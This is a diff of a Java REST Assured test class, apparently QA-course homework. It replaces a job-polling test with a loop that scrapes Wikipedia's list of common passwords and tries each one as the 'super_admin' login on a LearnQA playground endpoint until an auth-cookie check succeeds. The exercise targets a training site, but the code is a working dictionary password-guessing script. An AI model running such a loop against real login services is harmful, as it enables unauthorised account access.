@@ -1,9 +1,13 @@
+import io.restassured.http.ContentType;
 import io.restassured.path.json.JsonPath;
+import io.restassured.path.xml.XmlPath;
 import org.apache.http.util.Asserts;
 import org.junit.jupiter.api.Test;
 import io.restassured.RestAssured;
 import io.restassured.response.Response;
+import io.restassured.path.*;
 
+import java.io.File;
 import java.lang.reflect.Array;
 import java.sql.SQLOutput;
 import java.util.ArrayList;
@@ -11,45 +15,74 @@ import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 
+import static io.restassured.RestAssured.given;
+import static io.restassured.path.xml.XmlPath.CompatibilityMode.HTML;
+import static org.junit.jupiter.api.Assertions.assertEquals;
+
 public class HelloWorldTest {
 
 
     @Test
-    public void testRestAssuredEx7() throws InterruptedException {
+    public void testRestAssuredEx9() throws InterruptedException {
+
+        //получим пароли из Wiki
+        Response response = given()
+                .when().get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords").then().contentType(ContentType.HTML).extract()
+                .response();
+        assertEquals(response.getStatusCode(), 200);
+        //response.getBody().prettyPrint();
+        XmlPath htmlPath = new XmlPath(HTML, response.getBody().asString());
+
+        String table = htmlPath.getString("**.findAll { it.@class == 'wikitable' }[1]");
+        String[] passwords = table.split("\n");
 
 
-            JsonPath response = RestAssured
-                    .get("https://playground.learnqa.ru/ajax/api/longtime_job")
-                    .jsonPath();
+        String login = "super_admin";
+        String authResp;
+        int passCount=0;
 
-            String token = response.get("token");
-            int seconds = response.get("seconds");
+        Map<String,Object> body = new HashMap<>();
+        body.put("login", login);
+        body.put("password", passwords[passCount]);
+
+        do {
+
+            body.remove("password");
+            body.put("password", passwords[passCount]);
 
 
-            JsonPath response2 = RestAssured
-                    .given()
-                    .queryParam("token",token)
-                    .get("https://playground.learnqa.ru/ajax/api/longtime_job")
-                    .jsonPath();
+            Response response2 =
+                    given()
+                            .body(body)
+                            .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
+                            .andReturn();
 
-            String status = response2.get("status");
+            //response2.prettyPrint();
 
-            assert status.equals("Job is NOT ready");
+            String cookies = response2.getCookie("auth_cookie");
+            Map<String, String> cook = new HashMap<>();
+            cook.put("auth_cookie", cookies);
 
-            Thread.sleep(seconds*1000);
+            Response response3 =
+                    given()
+                            .cookies(cook)
+                            .when()
+                            .get("https://playground.learnqa.ru/api/check_auth_cookie")
+                            .andReturn();
 
-            JsonPath response3 = RestAssured
-                    .given()
-                    .queryParam("token",token)
-                    .get("https://playground.learnqa.ru/ajax/api/longtime_job")
-                    .jsonPath();
 
-            status = response3.get("status");
+            System.out.println(body.get("password"));
+            response3.print();
 
-            assert status.equals("Job is ready");
+            authResp=response3.asString();
+            passCount++;
 
-            String result = response3.get("result");
 
-            assert !result.equals(null);
+        }while(authResp.equals("You are NOT authorized"));
+
+        System.out.println("CORRECT PASSWORD: " + body.get("password"));
+
     }
+
+
 }
